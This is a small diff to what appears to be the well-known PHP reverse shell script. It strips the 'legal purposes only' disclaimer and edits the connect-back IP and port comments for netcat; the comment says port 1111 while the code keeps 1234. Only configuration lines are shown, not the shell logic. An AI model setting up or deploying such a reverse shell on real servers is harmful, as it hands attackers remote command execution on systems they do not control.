@@ -22,10 +22,6 @@
 // with this program; if not, write to the Free Software Foundation, Inc.,
 // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 //
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
-//
 // You are encouraged to send comments, improvements or suggestions to
 // me at pentestmonkey@pentestmonkey.net
 //
@@ -46,8 +42,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '127.0.0.1';  // CHANGE THIS TO MY IP
+$port = 1234;       // RUN NETCAT ON PORT 1111
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
